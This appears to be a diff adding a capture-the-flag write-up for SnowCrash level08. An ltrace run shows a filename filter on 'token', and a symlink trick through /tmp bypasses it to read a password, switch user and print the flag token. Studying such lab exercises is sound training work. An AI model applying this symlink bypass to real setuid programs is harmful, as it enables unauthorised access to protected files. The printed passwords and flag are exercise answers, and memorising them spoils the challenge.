@@ -1,0 +1,22 @@
+ltrace ./flag08/level08 $PWD/flag08/test             ──(Mon,Jun23)─┘
+__libc_start_main(0x8048554, 2, 0xffafecd4, 0x80486b0 <unfinished ...>
+strstr("/home/flash/Documents/SnowCrash/"..., "token")      = nil
+open("/home/flash/Documents/SnowCrash/"..., 0, 036777635674) = 3
+read(3, "test", 1024)                                       = 4
+write(1, "test", 4test)                                         = 4
++++ exited (status 4) +++
+
+
+└─(13:33:21 on main ✹ ✭)──> ./level08 token         1 ↵ ──(Mon,Jun23)─┘
+You may not access 'token'
+
+
+level08@SnowCrash:~$ ln -s $PWD/token /tmp/test
+level08@SnowCrash:~$ ./level08 /tmp/test
+quif5eloekouj29ke0vouxean
+
+level08@SnowCrash:~$ su flag08
+Password: 
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
